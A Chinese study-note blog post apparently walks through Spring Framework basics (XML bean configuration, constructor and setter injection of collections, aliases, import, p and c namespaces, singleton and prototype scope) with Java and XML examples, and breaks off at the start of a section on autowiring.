<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ys.dao.UserDao;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserDaoimpl;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserMysql;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserSQLServer;</span><br><span class="line"><span class="keyword">import</span> com.ys.service.UserService;</span><br><span class="line"><span class="keyword">import</span> com.ys.service.UserServiceimpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInMine</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        用户实际调用的是业务层，Dao层不允许他们接触！</span></span><br><span class="line">        UserServiceimpl userServiceimpl = <span class="keyword">new</span> UserServiceimpl();</span><br><span class="line"></span><br><span class="line">        userServiceimpl.setUserDao(<span class="keyword">new</span> UserSQLServer());</span><br><span class="line"></span><br><span class="line">        userServiceimpl.getUser();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是在spring当中，spring帮我们操作了什么？</p>
<p>我们没有NEW任何一个类，我们做的是去Spring的bean下配置xml~</p>
<p>我们如下构造xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    使用spring来创建我们的对象,在spring中都成为Bean--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    现在一个Bean相当于new 了一个对象--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--   我们在XML当中去配置了--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userMySQL&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserMysql&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userOranle&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserOranle&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userSQLServer&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserSQLServer&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userServiceimpl&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.service.UserServiceimpl&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;userMySQL&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>bean 就相当于new了这么一个类，ref则是取bean当中已经创建好的类。</p>
<p>所以我们的测试代码修改后为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ys.service.UserServiceimpl;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInMine</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean1.xml&quot;</span>);</span><br><span class="line">        UserServiceimpl userServiceimpl = (UserServiceimpl) 		      context.getBean(<span class="string">&quot;userServiceimpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        userServiceimpl.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-IOC创建对象的方式"><a href="#2-IOC创建对象的方式" class="headerlink" title="2 IOC创建对象的方式"></a>2 IOC创建对象的方式</h1><p>1.使用无参构造 默认创建</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public User()&#123;</span></span><br><span class="line"><span class="comment">////        System.out.println(&quot;wdndmd&quot;);</span></span><br><span class="line"><span class="comment">////    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name:&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我在这直接将无参构造去除，那么就会出现无法构建的问题，但是Spring也支持使用有参构造</p>
<p>构造器函数有三种方式：</p>
<ul>
<li><p>第一种，下标赋值</p>
</li>
<li><pre><code class="xml">&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt;
    &lt;constructor-arg index=&quot;0&quot; value=&quot;wdnmd&quot;/&gt;
&lt;/bean&gt;
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ 第二种，参数类型匹配</span><br><span class="line"></span><br><span class="line">+ &#96;&#96;&#96;xml</span><br><span class="line">  &lt;bean id&#x3D;&quot;user&quot; class&#x3D;&quot;com.ys.pojo.User&quot;&gt;</span><br><span class="line">      &lt;constructor-arg type&#x3D;&quot;java.lang.String&quot; value&#x3D;&quot;www&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;bean&gt;</span><br></pre></td></tr></table></figure></code></pre>
</li>
<li><p>通过参数名来进行赋值</p>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;www&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>要注意：</p>
<ul>
<li>我们如果使用了有参构造，spring就不会走无参构造的方法了</li>
<li>只要我们使用new ClassPathXmlApplicationContext创建，就会把XML当中的类全部注入进去，创建新类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserT</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;userT被创建了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserT</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如我们创建该java类</p>
<p>并在bean中扫描：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;user&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们便不会得到构造器应该返回那句话，但如果我们去掉上面的</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>则会得到构造器当中的话</p>
<p>同时我们要知道，我们创建的时候是一样的bean，对象并没有区别：</p>
<p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">User user = (User) context.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">User user2 = (User)context.getBean(<span class="string">&quot;user&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>两者是是一样的。</p>
<p>所以在配置文件加载的时候，容器中管理的对象就已经初始化了</p>
<h1 id="3-Spring配置"><a href="#3-Spring配置" class="headerlink" title="3. Spring配置"></a>3. Spring配置</h1><h2 id="3-1-别名"><a href="#3-1-别名" class="headerlink" title="3.1 别名"></a>3.1 别名</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">alias</span> <span class="attr">name</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;dnm&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用这样就可以得到一个别名除此之外，我们也可以通过：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userT2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    User user = (User) context.getBean(<span class="string">&quot;user2&quot;</span>);</span><br><span class="line">    User user2 = (User)context.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    System.out.println(user==user2);</span><br><span class="line">    user.show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试后是一样的</p>
<p>而且利用name的方式可以起多个别名</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user2,u2&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="3-2-Bean的配置"><a href="#3-2-Bean的配置" class="headerlink" title="3.2 Bean的配置"></a>3.2 Bean的配置</h2><h2 id="3-3-import"><a href="#3-3-import" class="headerlink" title="3.3 import"></a>3.3 import</h2><p>import一般被我们用于使用团队开发使用，它可以将多个配置文件导入合并为一个，方便程序员之间互相协作。</p>
<p>例如我先创建了如下三个配置的xml：</p>
<p>beans1.xml ,applicationContext.xml 以及beans.xml</p>
<p>在main函数当中我却只想使用一个，该如何操作呢？，这样我们应该：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans1.xml&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后再回到Mytest当中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样就相当于一口气组织了三个xml文件</p>
<p>同时再回到前面的别名的使用，这样的别名便于我们import合并的时候将他们合并在一起，会阻止重复的情况</p>
<h1 id="4-依赖注入（DI）"><a href="#4-依赖注入（DI）" class="headerlink" title="4 依赖注入（DI）"></a>4 依赖注入（DI）</h1><h2 id="4-1-构造器注入"><a href="#4-1-构造器注入" class="headerlink" title="4.1 构造器注入"></a>4.1 构造器注入</h2><p>前面已经说过</p>
<h2 id="4-2-SET方式注入【重点】"><a href="#4-2-SET方式注入【重点】" class="headerlink" title="4.2 SET方式注入【重点】"></a>4.2 SET方式注入【重点】</h2><ul>
<li>依赖注入：本质就是set注入！<ul>
<li>依赖什么？<ul>
<li>bean对象的创建依赖于容器</li>
</ul>
</li>
<li>注入什么？<ul>
<li>bean对象中的所有属性由容器来注入</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>关于复杂类型之前，我们有必要明白list，set，map都是来做什么的，以及他们的区别</p>
<p>详细我决定写在JAVA基础里面。</p>
<p>【环境搭建】</p>
<p>1.复杂类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Address</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAddress</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2.真实测试对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String[] books;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; hobbies;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; cards;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; games;</span><br><span class="line">    <span class="keyword">private</span> String wife;</span><br><span class="line">    <span class="keyword">private</span> Properties info;</span><br></pre></td></tr></table></figure>

<p>这些对象的各种注入方法：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Bean注入，使用ref--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;address1&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;books&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>Java基础<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>Java进程<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>Java编写<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JavaIOC<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JavaSpring<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cards&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;月曜&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1751111&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;月石&quot;</span> <span class="attr">value</span>=<span class="string">&quot;138217&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;games&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>战地<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>使命召唤<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>EA<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>奥里给<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>唱歌<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>下棋<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>睡觉<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;url&quot;</span>&gt;</span>/weibos?SSL=xxx<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;divers&quot;</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;username&quot;</span>&gt;</span>月石<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;password&quot;</span>&gt;</span>月曜<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;wife&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我在这里觉得比较重要的区别就是在于prop和map当中的差别</p>
<p>map因为强调的是键值对关系，所以写在map的标签当中，而prop中的值容易修改，所以我们写在标签中间。</p>
<p>总而言之记住就好了         </p>
<p>测试结果如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Student&#123;address=Address&#123;address=&#x27;安徽芜湖中出&#x27;&#125;, name=&#x27;月石&#x27;,</span><br><span class="line">books=[Java基础, Java进程, Java编写, JavaIOC, JavaSpring],</span><br><span class="line">hobbies=[唱歌, 下棋, 睡觉], </span><br><span class="line">cards=&#123;月曜=1751111, 月石=138217&#125;, </span><br><span class="line">games=[战地, 使命召唤, EA, 奥里给], wife=&#x27;null&#x27;, </span><br><span class="line">info=&#123;password=月曜, url=/weibos?SSL=xxx, divers=mysql, username=月石&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="4-3-拓展方式注入"><a href="#4-3-拓展方式注入" class="headerlink" title="4.3 拓展方式注入"></a>4.3 拓展方式注入</h2><p>除了上面的依赖注入以外，我们还可以使用P命名空间和C命名空间注入，但是他们必须利用XML约束。</p>
<p>具体例子如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;20&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">id</span>=<span class="string">&quot;user2&quot;</span> <span class="attr">p:age</span>=<span class="string">&quot;20&quot;</span> <span class="attr">p:name</span>=<span class="string">&quot;月曜&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user3&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">c:age</span>=<span class="string">&quot;21&quot;</span> <span class="attr">c:name</span>=<span class="string">&quot;月笙&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean2.xml&quot;</span>);</span><br><span class="line">    User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">    User user2 = context.getBean(<span class="string">&quot;user2&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">    System.out.println(user);</span><br><span class="line">    System.out.println(user2);</span><br><span class="line">    User user3 = context.getBean(<span class="string">&quot;user3&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">    System.out.println(user3);</span><br></pre></td></tr></table></figure>

<p>（想使用test记得导入junit哦</p>
<p>相同的，使用c标签就相当于使用构造器呢。</p>
<p>那么玩什么要使用c标签和p标签呢？</p>
<p>我猜想是如果我们对这种简单的注入方式统一的使用标签来进行注入，而复杂的使用prop来进行注入，可以简化我们的代码，当xml繁琐的时候也不至于一塌糊涂了把</p>
<p>官方文档：</p>
<p>namespace is not as flexible as the standard XML format. For example, the format for declaring property references clashes with properties that end in Ref, whereas the standard XML format does not. We recommend that you choose your approach carefully and communicate this to your team members, to avoid producing XML documents that use all three approaches at the same time.</p>
<p>意思是不够灵活，同时需要与团队沟通好，但是可以简化代码？</p>
<h1 id="5-Bean的作用域"><a href="#5-Bean的作用域" class="headerlink" title="5 Bean的作用域"></a>5 Bean的作用域</h1><p>主要是探讨原型和单例之间的差距：</p>
<ul>
<li><p>单例：</p>
<p>之后我们创建的时候即使创建很多个类，依然只有一个原型</p>
</li>
<li><p>多例：</p>
<p>每创建一个新的类都会创建一个新的类</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;月曜&quot; scope&#x3D;&quot;prototype&quot;&#x2F;&gt;</span><br><span class="line">&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;月曜&quot; scope&#x3D;&quot;singleton&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">       User user2 = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">       System.out.println(user.hashCode());</span><br><span class="line">       System.out.println(user2.hashCode());</span><br><span class="line">       System.out.println(user==user2);</span><br></pre></td></tr></table></figure>

<p>得到结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1075738627</span></span><br><span class="line"><span class="number">282828951</span></span><br><span class="line"><span class="keyword">false</span></span><br></pre></td></tr></table></figure>



<h1 id="6-Bean的自动装配"><a href="#6-Bean的自动装配" class="headerlink" title="6. Bean的自动装配"></a>6. Bean的自动装配</h1><ul>
<li>自动装配是Spring满足bean依赖的一种方式！</li>
<li>Spring会在上下文中自动寻找，并自动给bean装配属性</li>
</ul>
<p>在Spring中有三种自动装配的方式：</p>
<ol>
<li>在XML中显式的配置</li>
<li>在Java中显式的配置</li>
<li>隐式的自动装配bean【重要】</li>
</ol>
<h2 id="6-1-测试环境"><a href="#6-1-测试环境" class="headerlink" title="6.1 测试环境"></a>6.1 测试环境</h2><ol>
<li>一个人有两条狗！</li>
</ol>
<p>Cat：</p>
